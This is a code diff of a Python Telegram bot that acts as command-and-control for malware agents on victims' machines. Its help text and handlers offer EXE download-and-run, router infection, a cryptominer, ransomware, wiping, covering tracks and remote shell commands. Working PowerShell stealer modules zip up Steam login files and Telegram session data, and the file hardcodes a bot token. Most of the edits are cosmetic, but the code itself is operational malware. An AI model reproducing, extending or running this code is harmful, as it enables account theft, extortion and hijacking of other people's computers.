@@ -7,8 +7,8 @@ import telebot, json, time, base64, os, re, random, string, subprocess
 TOKEN = os.environ.get("BOT_TOKEN", "8800452125:AAETWvKIeP6BgDKWaSAmAhGm6WAq8TCm7pc")  # или вставьте токен напрямую
 ADMIN_ID = 6099860667  # ваш числовой Telegram ID
 
+# === СОЗДАНИЕ БОТА ===
 bot = telebot.TeleBot(TOKEN)
-bot.parse_mode = None  # отключаем любую разметку
 
 agents = {}
 selected = {}
@@ -40,39 +40,40 @@ def confirm_kb(aid, cmd_name, target, body):
     pending[aid] = {"cmd": cmd_name, "target": target, "body": body, "token": token, "expires": time.time()+120}
     kb = telebot.types.InlineKeyboardMarkup(row_width=2)
     kb.add(
-        telebot.types.InlineKeyboardButton("ПОДТВЕРЖДАЮ", callback_data=f"c_{token}"),
-        telebot.types.InlineKeyboardButton("ОТМЕНА", callback_data=f"x_{token}")
+        telebot.types.InlineKeyboardButton("✅ ПОДТВЕРЖДАЮ", callback_data=f"c_{token}"),
+        telebot.types.InlineKeyboardButton("❌ ОТМЕНА", callback_data=f"x_{token}")
     )
     return kb
 
+# ==================== КОМАНДЫ ====================
 @bot.message_handler(commands=['start', 'help'])
 def help_cmd(msg):
     if not is_admin(msg.from_user.id):
         bot.reply_to(msg, f"Ваш ID: {msg.from_user.id}. Нет доступа.")
         return
-    bot.reply_to(msg, (
-        "Команды:\n"
-        "/clients - список агентов\n"
-        "/select id - выбрать цель\n"
-        "/runkit id all module - запустить модуль\n"
-        "/autorun id all url - загрузить EXE\n"
-        "/scan_network - сканировать сеть\n"
-        "/infect_routers - заразить роутеры\n"
-        "/miner_power id all 0-100 - мощность майнера\n"
-        "/miner_stop id all - остановить майнер\n"
-        "/ransomware - шифровальщик\n"
-        "/kill - удалить агента\n"
-        "/wipe - стереть всё\n"
-        "/cover_tracks - замести следы\n"
-        "/screenshot - скриншот\n"
-        "/shell команда - выполнить команду"
-    ))
+    bot.reply_to(msg, """
+Команды:
+/clients - список агентов
+/select <id> - выбрать цель
+/runkit <id|all> <модуль> - запустить модуль
+/autorun <id|all> <url> - загрузить EXE
+/scan_network - сканировать сеть
+/infect_routers - заразить роутеры
+/miner_power <id|all> <0-100> - мощность майнера
+/miner_stop <id|all> - остановить майнер
+/ransomware - шифровальщик
+/kill - удалить агента
+/wipe - стереть всё
+/cover_tracks - замести следы
+/screenshot - скриншот
+/shell <команда> - выполнить команду
+""")
 
 @bot.message_handler(commands=['clients'])
 def clients_cmd(msg):
     if not is_admin(msg.from_user.id): return
     if not agents:
-        bot.reply_to(msg, "Нет агентов")
+        bot.reply_to(msg, "Нет подключённых агентов")
         return
     text = "Агенты:\n\n"
     for cid, info in agents.items():
@@ -85,7 +86,7 @@ def select_cmd(msg):
     if not is_admin(msg.from_user.id): return
     parts = msg.text.split()
     if len(parts) < 2:
-        bot.reply_to(msg, "/select id")
+        bot.reply_to(msg, "/select <id>")
         return
     try:
         cid = int(parts[1])
@@ -95,6 +96,7 @@ def select_cmd(msg):
         else: bot.reply_to(msg, "Агент не найден")
     except: bot.reply_to(msg, "Некорректный ID")
 
+# ==================== МОДУЛИ ====================
 STEAL_MODULES = {
     "steal_steam": r'POWERSHELL: $steam=@("$env:PROGRAMFILES\Steam","$env:PROGRAMFILES(X86)\Steam","C:\Steam")|?{Test-Path $_}|select -First 1; if($steam){$d="$env:TEMP\steam";New-Item -ItemType Directory $d -Force|Out-Null; Copy-Item "$steam\config\loginusers.vdf","$steam\config\config.vdf","$steam\ssfn*","$steam\userdata" $d -Recurse -Force; Compress-Archive $d "$env:TEMP\steam.zip" -Force; Remove-Item $d -Recurse -Force}',
     "steal_telegram": r'POWERSHELL: $tg="$env:APPDATA\Telegram Desktop\tdata"; if(Test-Path $tg){taskkill /f /im telegram.exe 2>$null; Sleep 2; Compress-Archive $tg "$env:TEMP\tg_session.zip" -Force}',
@@ -121,7 +123,7 @@ def runkit_cmd(msg):
     if not is_admin(msg.from_user.id): return
     parts = msg.text.split()
     if len(parts) < 3:
-        bot.reply_to(msg, "Формат: /runkit id all module\nДоступные: " + ", ".join(STEAL_MODULES.keys()))
+        bot.reply_to(msg, "Формат: /runkit <id|all> <модуль>\nМодули: " + ", ".join(STEAL_MODULES.keys()))
         return
     target_spec = parts[1].lower()
     mod = parts[2].lower()
@@ -146,7 +148,7 @@ def autorun_cmd(msg):
     if not is_admin(msg.from_user.id): return
     parts = msg.text.split()
     if len(parts) < 3:
-        bot.reply_to(msg, "Формат: /autorun id all url")
+        bot.reply_to(msg, "Формат: /autorun <id|all> <url>")
         return
     target_spec = parts[1].lower()
     url = parts[2]
@@ -167,7 +169,9 @@ def autorun_cmd(msg):
 def scan_network_cmd(msg):
     if not is_admin(msg.from_user.id): return
     t = auto_target(msg.from_user.id)
-    if not t: bot.reply_to(msg, "Нет целей"); return
+    if not t:
+        bot.reply_to(msg, "Нет целей. Выберите через /select")
+        return
     cmd = r'PYTHON: import subprocess,json,re,socket,base64; out=subprocess.check_output("arp -a",shell=True).decode(); res={"devices":[]}; [res["devices"].append({"ip":m.group(1),"mac":m.group(2)}) for m in re.finditer(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F:-]+)",out)]; print("NETMAP:"+base64.b64encode(json.dumps(res).encode()).decode())'
     send_exec(t, cmd)
     bot.reply_to(msg, f"Сканирование сети на {agents[t]['hostname']}")
@@ -182,12 +186,13 @@ def infect_routers_cmd(msg):
     kb = confirm_kb(msg.from_user.id, "infect_routers", t, cmd)
     bot.reply_to(msg, f"Заразить роутеры на {agents[t]['hostname']}?", reply_markup=kb)
 
+# ==================== МАЙНЕР ====================
 @bot.message_handler(commands=['miner_power'])
 def miner_power_cmd(msg):
     if not is_admin(msg.from_user.id): return
     parts = msg.text.split()
     if len(parts) < 3:
-        bot.reply_to(msg, "Формат: /miner_power id all 0-100")
+        bot.reply_to(msg, "Формат: /miner_power <id|all> <0-100>")
         return
     target_spec = parts[1].lower()
     try:
@@ -215,7 +220,7 @@ def miner_stop_cmd(msg):
     if not is_admin(msg.from_user.id): return
     parts = msg.text.split()
     if len(parts) < 2:
-        bot.reply_to(msg, "Формат: /miner_stop id all")
+        bot.reply_to(msg, "Формат: /miner_stop <id|all>")
         return
     target_spec = parts[1].lower()
     cmd = "MINER_INTENSITY:0"
@@ -232,6 +237,7 @@ def miner_stop_cmd(msg):
             else: bot.reply_to(msg, "Агент не найден")
         except: bot.reply_to(msg, "Некорректный ID")
 
+# ==================== ОПАСНЫЕ КОМАНДЫ ====================
 @bot.message_handler(commands=['ransomware'])
 def ransomware_cmd(msg):
     if not is_admin(msg.from_user.id): return
@@ -286,26 +292,37 @@ def shell_cmd(msg):
     send_exec(t, cmd)
     bot.reply_to(msg, f"Выполнено: {parts[1][:50]} на {agents[t]['hostname']}")
 
+# ==================== РЕГИСТРАЦИЯ АГЕНТА ====================
 @bot.message_handler(func=lambda m: m.text and m.text.startswith("REG:"))
 def reg_agent(msg):
     try:
         data = json.loads(base64.b64decode(msg.text[4:]).decode())
         cid = msg.chat.id
-        agents[cid] = {"hostname": data.get("hostname","?"), "os": data.get("os","?"), "ip": data.get("ip","?"), "intensity": 0, "status": "Онлайн"}
-        if len(agents) == 1: selected[ADMIN_ID] = cid
+        agents[cid] = {
+            "hostname": data.get("hostname","?"),
+            "os": data.get("os","?"),
+            "ip": data.get("ip","?"),
+            "intensity": 0,
+            "status": "Онлайн"
+        }
+        if len(agents) == 1:
+            selected[ADMIN_ID] = cid
         bot.send_message(ADMIN_ID, f"Агент подключён: {data.get('hostname')}")
     except Exception as e:
         print(f"REG error: {e}")
 
+# ==================== ПОДТВЕРЖДЕНИЯ ====================
 @bot.callback_query_handler(func=lambda c: c.data.startswith("c_") or c.data.startswith("x_"))
 def confirm_callback(call):
     if not is_admin(call.from_user.id): return
     tok = call.data[2:]
     if call.from_user.id not in pending or pending[call.from_user.id]["token"] != tok:
-        bot.answer_callback_query(call.id, "Истекло"); return
+        bot.answer_callback_query(call.id, "Истекло")
+        return
     p = pending.pop(call.from_user.id)
     if call.data.startswith("x_"):
-        bot.edit_message_text("Отменено", call.message.chat.id, call.message.message_id); return
+        bot.edit_message_text("Отменено", call.message.chat.id, call.message.message_id)
+        return
     send_exec(p["target"], p["body"])
     bot.edit_message_text("Выполнено", call.message.chat.id, call.message.message_id)
 
